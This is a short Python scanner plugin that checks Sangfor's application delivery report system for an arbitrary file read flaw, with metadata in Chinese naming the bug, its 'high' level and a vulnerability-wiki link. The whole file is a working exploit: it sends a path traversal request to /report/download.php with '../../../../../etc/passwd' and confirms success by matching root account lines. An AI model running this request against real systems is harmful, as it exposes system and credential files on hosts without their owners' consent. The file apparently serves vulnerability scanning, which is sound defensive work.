#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = "https://peiqi.wgpsec.org/wiki/webapp/深信服/深信服 应用交付报表系统 download.php 任意文件读取漏洞.html"
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "深信服应用交付报表系统download.php任意文件读取漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/report/download.php?pdf=../../../../../etc/passwd"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret